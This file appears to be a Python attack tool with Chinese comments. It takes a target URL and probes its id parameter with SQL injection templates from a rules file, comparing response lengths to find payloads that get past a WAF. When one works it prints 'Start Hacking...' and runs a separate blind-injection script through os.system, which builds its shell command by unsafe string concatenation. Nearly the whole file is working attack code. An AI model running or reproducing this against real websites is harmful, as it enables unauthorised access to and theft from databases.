#!/usr/bin/env python
# encoding=utf-8

import requests
import sys
import os
import urllib
import binascii
import base64

if len(sys.argv) != 2:
    print("Usage : " + "python " + sys.argv[0] + " [URL]")
    print("Example : python " + sys.argv[0] + " \"http://www.xxx.com/index.php?id=1\"")
    exit(1)

# 将参数添加至URL中
def urlEncodeAllChar(content):
    temp = {'id':content}
    tempUrl = urllib.parse.urlencode(temp)
    return tempUrl.split("=")[1]

# 获取十六进制编码
def getHexChar(content):
    return binascii.b2a_hex(content.encode()).decode()

# 基于规则的替换 , 并不完善
def getEscapeChar(content):
    content = content.replace("\\","\\\\") # 顺序很重要 , 转义替换转义字符\必须放在第一个
    content = content.replace("'","\\'")
    content = content.replace("\"","\\\"")
    return content

# url编码
def urlEncodeQuote(content):
    return content.replace("'","%27")

url = sys.argv[1]
baseUrl = url.split("=")[0] + "="
# 截取用户输入URL中的参数的值
currentQuery = url.split("=")[1] # 正确的查询参数
print("----------------------")
print("Checking : " + url)
print("----------------------")
counter = 0
payloads = []
rules = open('rules', 'r',encoding="utf-8")
wrongQuery = "-1" # 正确的查询参数 # TODO 这里是否也需要作为参数提取出来
url = baseUrl + currentQuery
contentLength = len(requests.get(url).text)
for line in rules:
    if line.startswith("#"):
        continue
    if line == "\r\n":
        continue
    line = line.replace("\r","")
    line = line.replace("\n","")
    line = urlEncodeAllChar(line)
    startTemp = line.split(urlEncodeAllChar("()"))[0]
    endTemp = line.split(urlEncodeAllChar("()"))[1]
    # 构造payload
    payload1 = startTemp + "(" + wrongQuery + ")" + endTemp
    testUrl1 = baseUrl + payload1
    payload2 = startTemp + "(" + currentQuery + ")" + endTemp
    testUrl2 = baseUrl + payload2
    content1 = requests.get(testUrl1).text
    # 对返回值1进行处理
    content1 = content1.replace(payload1,currentQuery)
    content1 = content1.replace(getHexChar(urllib.parse.unquote(payload1)),currentQuery) # 替换掉Hex字符
    content1 = content1.replace(getEscapeChar(urllib.parse.unquote(payload1)),currentQuery) # 替换掉转义字符
    content1 = content1.replace(base64.b64encode(urllib.parse.unquote(payload1).encode()).decode(),currentQuery) # 替换掉Base64编码
    content1 = content1.replace(urllib.parse.unquote(payload1),currentQuery) # 替换掉URL编码
    len1 = len(content1)
    # 对返回值1进行处理
    content2 = requests.get(testUrl2).text
    content2 = content2.replace(payload2,currentQuery)
    content2 = content2.replace(getHexChar(urllib.parse.unquote(payload2)),currentQuery) # 替换掉Hex字符
    content2 = content2.replace(getEscapeChar(urllib.parse.unquote(payload2)),currentQuery) # 替换掉转义字符
    content2 = content2.replace(base64.b64encode(urllib.parse.unquote(payload2).encode()).decode(),currentQuery) # 替换掉Base64编码
    content2 = content2.replace(urllib.parse.unquote(payload2),currentQuery) # 替换掉URL编码
    len2 = len(content2)
    # 前一个判断是否报错，后一个判断是否被waf拦截
    if (len1 != contentLength) and (len2 == contentLength):
        baseUrl = urllib.parse.unquote(baseUrl)
        line = urllib.parse.unquote(line)
        payload = baseUrl + line
        payloads.append(line)
        counter += 1
        print(payload)
print("----------------------")
print(counter," valunable found!")
print("----------------------")
if counter != 0:
    print("Start Hacking...")
    # 添加转义
    hack_payload = payloads[0]
    hack_payload = hack_payload.replace("\"","\\\"")
    command = "python boolInject.py \"" + hack_payload + "\" \"" + baseUrl + "\" \"" + currentQuery + "\""
    print("Exce : " + command)
    os.system(command)
